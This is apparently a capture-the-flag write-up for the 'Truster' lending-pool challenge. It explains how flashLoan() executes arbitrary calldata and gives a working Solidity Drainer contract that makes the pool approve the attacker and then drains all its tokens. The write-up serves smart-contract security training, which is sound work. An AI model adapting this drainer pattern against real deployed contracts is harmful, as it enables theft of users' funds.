# Statement:

<img width="869" height="506" alt="image" src="https://github.com/user-attachments/assets/1c70ae9c-bfa5-4cb3-8d51-98b323d6f17e" />

### In this contract, we only have one function: `flashLoan`

## 📌 Overview

The Truster Lender Pool exposes an arbitrary call vulnerability through its `flashLoan()` function. Even though the pool holds 1,000,000 DVT tokens, it never validates the target and data arguments, allowing an attacker to force the pool to execute any call — including ERC20 `approve()`.

This makes it possible to trick the pool into approving an attacker-controlled contract to spend all its tokens.

## 🧨 Vulnerability

The `flashLoan()` function allows an external call with arbitrary calldata:


`tokenAddress.functionCall(data);`


There are no checks on:

- the called contract,
- the calldata,
- or the loan amount (you can borrow 0 tokens).

This means an attacker can make the pool execute:

`token.approve(attacker, <large_amount>);`


Once the pool approves the attacker as a spender, the attacker can directly drain all tokens via transferFrom.


## Solution:

I created the different contract called `Drainer` in the test file to use this exploit and drain all the funds to the recovery account:

```solidity
contract Drainer {
    constructor(DamnValuableToken token, TrusterLenderPool pool, address recovery) {

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            token.balanceOf(address(pool))
        );

        pool.flashLoan(0, address(this), address(token), data);

        token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
    }
}
```

Then simply used this contract in our `test_truster()` function:

```solidity
    function test_truster() public checkSolvedByPlayer {
        Drainer drainer = new Drainer(token, pool, recovery);
    }
```

## Worked Successfully:  

<img width="556" height="133" alt="image" src="https://github.com/user-attachments/assets/759b3ed5-6540-4b23-87bb-c6fcd652dec1" />


